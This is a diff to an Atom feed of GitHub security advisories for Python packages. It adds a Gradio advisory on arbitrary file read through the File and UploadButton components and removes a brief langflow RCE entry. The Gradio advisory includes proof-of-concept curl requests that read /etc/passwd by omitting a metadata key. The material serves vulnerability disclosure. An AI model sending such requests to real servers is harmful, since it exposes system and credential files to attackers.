@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2024-11-06T16:01:38.601Z</updated>
+    <updated>2024-11-06T17:01:25.596Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,91 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[gradio] Gradio vulnerable to arbitrary file read with File and UploadButton components]]></title>
+        <id>https://github.com/advisories/GHSA-rhm9-gp5p-5248</id>
+        <link href="https://github.com/advisories/GHSA-rhm9-gp5p-5248"/>
+        <updated>2024-11-06T16:29:57.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>If File or UploadButton components are used as a part of Gradio application to preview file content, an attacker with access to the application might abuse these components to read arbitrary files from the application server.</p>
+<h3 id="details">Details</h3>
+<p>Consider the following application where a user can upload a file and preview its content:</p>
+<pre><code>import gradio as gr
+
+def greet(value: bytes):
+    return str(value)
+
+demo = gr.Interface(fn=greet, inputs=gr.File(type="binary"), outputs="textbox")
+
+if __name__ == "__main__":
+    demo.launch()
+</code></pre>
+<p>If we run this application and make the following request (which attempts to read the <code>/etc/passwd</code> file)</p>
+<pre><code>curl 'http://127.0.0.1:7860/gradio_api/run/predict' -H 'content-type: application/json' --data-raw '{"data":[{"path":"/etc/passwd","orig_name":"test.txt","size":4,"mime_type":"text/plain","meta":{"_type":"gradio.FileData"}}],"event_data":null,"fn_index":0,"trigger_id":8,"session_hash":"mnv42s5gt7"}'
+</code></pre>
+<p>Then this results in the following error on the server</p>
+<pre><code>gradio.exceptions.InvalidPathError: Cannot move /etc/passwd to the gradio cache dir because it was not uploaded by a user.
+</code></pre>
+<p>This is expected. However, if we now remove the <code>"meta":{"_type":"gradio.FileData"}</code> from the request:</p>
+<pre><code>curl 'http://127.0.0.1:7860/gradio_api/run/predict' -H 'content-type: application/json' --data-raw '{"data":[{"path":"/etc/passwd","orig_name":"test.txt","size":4,"mime_type":"text/plain"}],"event_data":null,"fn_index":0,"trigger_id":8,"session_hash":"mnv42s5gt7"}'
+</code></pre>
+<p>This doesn't cause an error and results in the content of /etc/passwd being shown in the response!</p>
+<p>This works because Gradio relies on the <code>processing_utils.async_move_files_to_cache</code> to sanitize all incoming file paths in all inputs. This function performs the following operation</p>
+<pre><code>    return await client_utils.async_traverse(
+        data, _move_to_cache, client_utils.is_file_obj_with_meta
+    )
+</code></pre>
+<p>where <code>client_utils.is_file_obj_with_meta</code> is used as a filter which tells on which inputs to perform the <code>_move_to_cache</code> function (which also performs the allowed/disallowed check on the file path). The problem is that <code>client_utils.is_file_obj_with_meta</code> is not guaranteed to trigger for every input that contains a file path:</p>
+<pre><code>def is_file_obj_with_meta(d) -&gt; bool:
+    """
+    Check if the given value is a valid FileData object dictionary in newer versions of Gradio
+    where the file objects include a specific "meta" key, e.g.
+    {
+        "path": "path/to/file",
+        "meta": {"_type: "gradio.FileData"}
+    }
+    """
+    return (
+        isinstance(d, dict)
+        and "path" in d
+        and isinstance(d["path"], str)
+        and "meta" in d
+        and d["meta"].get("_type", "") == "gradio.FileData"
+    )
+</code></pre>
+<p>For example, as in the PoC, the file path won't be checked if the <code>meta</code> key is not present in the request or if <code>_type</code> is not <code>gradio.FileData</code>.</p>
+<p>Then, the path remains under control of the attacker and is used to read a file in <code>_process_single_file</code> function in <code>file.py</code> and <code>upload_button.py</code> (and possibly other places)</p>
+<h3 id="poc">PoC</h3>
+<p>As described above, run the following Gradio app</p>
+<pre><code>import gradio as gr
+
+def greet(value: bytes):
+    return str(value)
+
+demo = gr.Interface(fn=greet, inputs=gr.File(type="binary"), outputs="textbox")
+
+if __name__ == "__main__":
+    demo.launch()
+</code></pre>
+<p>And make the following request</p>
+<pre><code>curl 'http://127.0.0.1:7860/gradio_api/run/predict' -H 'content-type: application/json' --data-raw '{"data":[{"path":"/etc/passwd","orig_name":"test.txt","size":4,"mime_type":"text/plain"}],"event_data":null,"fn_index":0,"trigger_id":8,"session_hash":"mnv42s5gt7"}'
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Arbitrary file read in specific Gradio applications that use File or UploadButton components to upload files and echo/preview the content to the user.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gradio-app/gradio/security/advisories/GHSA-rhm9-gp5p-5248">https://github.com/gradio-app/gradio/security/advisories/GHSA-rhm9-gp5p-5248</a></li>
+<li><a href="https://github.com/advisories/GHSA-rhm9-gp5p-5248">https://github.com/advisories/GHSA-rhm9-gp5p-5248</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rhm9-gp5p-5248</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2024-11-06T16:29:57.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[codechecker] codechecker authentication method confusion vulnerability allows logging in as the built-in root user from an external service]]></title>
         <id>https://github.com/advisories/GHSA-fpm5-2wcj-vfr7</id>
@@ -519,26 +604,5 @@ You can look for the following pattern in the logs to check if the vulnerabilty 
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2024-11-01T21:39:13.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[langflow] langflow has vulnerability in PythonCodeTool component]]></title>
-        <id>https://github.com/advisories/GHSA-56m6-4mhw-h3g5</id>
-        <link href="https://github.com/advisories/GHSA-56m6-4mhw-h3g5"/>
-        <updated>2024-11-01T21:38:03.000Z</updated>
-        <content type="html"><![CDATA[<p>langflow v1.0.12 was discovered to contain a remote code execution (RCE) vulnerability via the PythonCodeTool component.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42835">https://nvd.nist.gov/vuln/detail/CVE-2024-42835</a></li>
-<li><a href="https://github.com/langflow-ai/langflow/issues/2908">https://github.com/langflow-ai/langflow/issues/2908</a></li>
-<li><a href="https://github.com/advisories/GHSA-56m6-4mhw-h3g5">https://github.com/advisories/GHSA-56m6-4mhw-h3g5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-56m6-4mhw-h3g5</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-10-31T15:30:59.000Z</published>
     </entry>
 </feed>
